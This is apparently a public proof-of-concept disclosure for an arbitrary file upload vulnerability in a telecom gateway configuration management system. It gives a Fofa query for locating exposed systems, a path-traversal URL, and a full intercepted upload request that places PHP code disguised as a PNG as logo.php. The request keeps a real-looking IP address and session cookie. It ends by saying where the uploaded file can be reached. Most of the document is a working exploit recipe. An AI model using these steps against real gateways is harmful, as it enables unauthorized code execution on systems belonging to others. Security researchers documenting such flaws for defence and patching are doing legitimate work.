### Telecom Gateway Configuration Management System Arbitrary File Upload

**Fofa Query:** `body="img/dl.gif" && title="系统登录"`

**Vulnerability Description:** The telecom gateway configuration system suffers from an arbitrary file upload vulnerability.

**Vulnerability POC (Proof of Concept):**

1. **Firstly, visit the following URL:**

   ```
   /newlive/manager/self_detail.php?dir=../../
   ```

2. **Then, click on the following images:**

 ![image](https://github.com/user-attachments/assets/286b6a33-30dd-4d06-8b7b-6366b788b1a0)


   Select any option:

![image](https://github.com/user-attachments/assets/cb8d3c4f-b0eb-472c-bdd0-8807be6b56df)


![image](https://github.com/user-attachments/assets/269b6909-1749-4fab-af0a-d7bc8a07c51f)


3. **Choose a PNG file, click upload, and intercept the request. Modify it as follows:**

   ```
   POST /newlive/manager/upload_file.php HTTP/1.1
   Host: 
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
   Accept: */*
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   Accept-Encoding: gzip, deflate, br
   Content-Type: multipart/form-data; boundary=---------------------------378396372240200292154061098840
   Content-Length: 727
   Origin: http://60.179.171.239:8090
   Connection: keep-alive
   Referer: http:///newlive/manager/upload_file.php?dir=1
   Cookie: PHPSESSID=056etpqra4hh46jgcl8u6jcch2
   Priority: u=0

   -----------------------------378396372240200292154061098840
   Content-Disposition: form-data; name="file"; filename="blob"
   Content-Type: application/octet-stream

   �PNG
   
   <?php phpinfo();?>
   -----------------------------378396372240200292154061098840
   Content-Disposition: form-data; name="blob_num"

   1
   -----------------------------378396372240200292154061098840
   Content-Disposition: form-data; name="total_blob_num"

   1
   -----------------------------378396372240200292154061098840
   Content-Disposition: form-data; name="file_name"

   logo.php
   -----------------------------378396372240200292154061098840
   Content-Disposition: form-data; name="dir"

   1
   -----------------------------378396372240200292154061098840--
   ```

   ![image](https://github.com/user-attachments/assets/cc4352a6-cd92-4d92-9c77-d7b994bfc192)


4. **Access the uploaded file:**

   ```
   http://xxxxxx/newlive/upload/media/'directory'/returned_file_name
   ```

---

Please ensure that you have the necessary permissions and legal rights to conduct penetration testing in your environment to avoid any unauthorized activities.
